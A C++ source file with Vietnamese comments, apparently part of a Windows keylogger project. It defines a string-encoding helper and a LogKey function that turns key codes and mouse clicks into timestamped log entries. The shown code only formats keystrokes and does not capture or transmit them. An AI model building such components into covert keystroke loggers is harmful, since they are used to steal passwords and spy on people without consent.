#include <iostream>
#include <Windows.h> 
#include <sstream>
#include <ctime> // Thư viện để làm việc với thời gian
#include "Headers/keylogger.h"

std::string AnsiToUtf8(const std::string& ansi_str)
{
    // Tính toán kích thước buffer cho Wide String (UTF-16)
    int wide_size = MultiByteToWideChar(CP_ACP, 0, ansi_str.c_str(), -1, nullptr, 0);
    if (wide_size == 0) return "";
    std::wstring wstr(wide_size, 0);

    MultiByteToWideChar(CP_ACP, 0, ansi_str.c_str(), -1, &wstr[0], wide_size);

    // Tính toán kích thước buffer cho UTF-8
    int utf8_size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, nullptr, 0, nullptr, nullptr);
    if (utf8_size == 0) return "";
    std::string utf8_str(utf8_size, 0);

    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &utf8_str[0], utf8_size, nullptr, nullptr);

    // Loại bỏ ký tự null cuối chuỗi
    if (!utf8_str.empty() && utf8_str.back() == 0) {
        utf8_str.pop_back();
    }
    return utf8_str;
}
// Hàm ghi lại phím bấm vào chuỗi toàn cục
std::string LogKey(int key_stroke)
{
    std::string log_entry;
    std::stringstream ss;

    // --- Lấy và định dạng thời gian ---
    time_t now = time(0);
    struct tm *ltm = localtime(&now);

    // [YYYY-MM-DD HH:MM:SS]
    ss << "[" << 1900 + ltm->tm_year << "-" 
       << 1 + ltm->tm_mon << "-" 
       << ltm->tm_mday << " "
       << ltm->tm_hour << ":" 
       << ltm->tm_min << ":" 
       << ltm->tm_sec << "] ";
    // ------------------------------------------

    // Ghi lại các phím chuột
    switch (key_stroke)
    {
        case VK_LBUTTON:
            ss << "[LEFT_CLICK]";
            break;
        case VK_RBUTTON:
            ss << "[RIGHT_CLICK]";
            break;
        case VK_MBUTTON:
            ss << "[MIDDLE_CLICK]";
            break;
        case VK_XBUTTON1:
            ss << "[X_BUTTON_1]";
            break;
        case VK_XBUTTON2:
            ss << "[X_BUTTON_2]";
            break;
        // Ghi lại các phím đặc biệt trên bàn phím
        case VK_SHIFT:
            ss << "[SHIFT]";
            break;
        case VK_BACK:
            ss << "[BACKSPACE]";
            break;
        case VK_RETURN:
            ss << "[ENTER]";
            break;
        case VK_CONTROL:
            ss << "[CTRL]";
            break;
        case VK_MENU: // ALT key
            ss << "[ALT]";
            break;
        case VK_CAPITAL:
            ss << "[CAPS_LOCK]";
            break;
        case VK_TAB:
            ss << "[TAB]";
            break;
        case VK_SPACE:
            ss << "[SPACE]";
            break;
        case VK_DELETE:
            ss << "[DELETE]";
            break;
        case VK_ESCAPE:
            ss << "[ESC]";
            break;
        default:
            // Xử lý các phím chữ và số
            if ((key_stroke >= 'A') && (key_stroke <= 'Z') && !(GetKeyState(VK_SHIFT) & 0x8000) && !(GetKeyState(VK_CAPITAL) & 1))
            {
                key_stroke += 32; // Chuyển sang chữ thường
            }
            ss << (char)key_stroke;
            break;
    }
    
    // Thêm nội dung vào chuỗi log
    log_entry += ss.str();
    
    log_entry += "\n";
    return log_entry;
}